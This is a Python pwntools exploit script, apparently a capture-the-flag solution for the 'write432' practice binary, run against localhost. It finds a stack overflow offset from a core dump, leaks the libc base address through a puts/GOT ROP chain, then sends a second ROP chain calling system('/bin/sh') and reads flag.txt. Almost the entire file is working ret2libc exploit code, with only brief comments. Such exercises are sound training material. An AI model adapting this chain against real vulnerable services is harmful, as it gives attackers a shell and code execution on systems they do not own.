from pwn import *

# use the following command to have the binary listen on localhost:1234
# socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./write432

LOCATION = "./write432"         # Position of the binary 
LIBC_LOC = "/lib32/libc.so.6"
binary = ELF(LOCATION)          # create object with data from the binary
libc   = ELF(LIBC_LOC)          # create object with data from the libc
ropbin = ROP(binary)            # create object to help build ropchain to leak libc base address
roplib = ROP(libc)              # create object to help build ropchain to craft exploit
r = remote("localhost", 1234)   # establish connection with the binary

def overflow():                                         # function used to find return address offset
    log.info("Finding saved return address offset...")                   
    proc = process(LOCATION, timeout=2)                 # start local process 
    proc.sendline(cyclic(1024))                         # send cyclic pattern 
    proc.recvall()                                      # receive data from process
    core = Core("core")                                 # create object from data of the core dump
    offset = cyclic_find(core.pc)                       # calculate offset from cyclic pattern
    log.success("Saved return address at offset {0}".format(offset))
    return 'A' * offset                                 # return as much A's as needed

def findBaseAddr():         # function used to leak libc base address
    leak  = ""
    leak += padding         # overflow until saved return address
    leak += makeRopToLeak() # append ropchain to overwrite return address
    r.recvuntil(">")        
    r.sendline(leak)        # send leak string
    r.recv()
    libc.address = u32(r.recv(4)) - libc.symbols["puts"] # update libc base address
    log.success("Base address of libc is at {0}".format(hex(libc.address)))


def makeRopToLeak():                # function used to generate ropchain to leak libc base address
    ropbin.puts(binary.got["puts"]) # call puts with puts' GOT entry as argument
    ropbin.main()                   # call main in order to keep the binary from crashing
    return str(ropbin)              # return ropchain

def makeRopToHack():                                    # function used to craft ropchain for the exploit
    roplib.system(libc.search("/bin/sh\x00").next())    # append system("/bin/sh") to ropchain
    return str(roplib)

def exploit():
    findBaseAddr()                      # find base address
    exp  = ""                           # create exploit string
    exp += padding                      # add A's to overflow until the return address
    exp += makeRopToHack()              # overwrite return address with ropchain beginning
    r.recvuntil('>')                    # receive data from the remote process until the prompt
    r.sendline(exp)                     # send exploit
    r.recv()
    #r.interactive()                    # uncomment to get full shell
    r.sendline("cat flag.txt && exit") 
    log.success("Flag: " + r.recvall())  # profit

padding = overflow()
exploit() # start everything
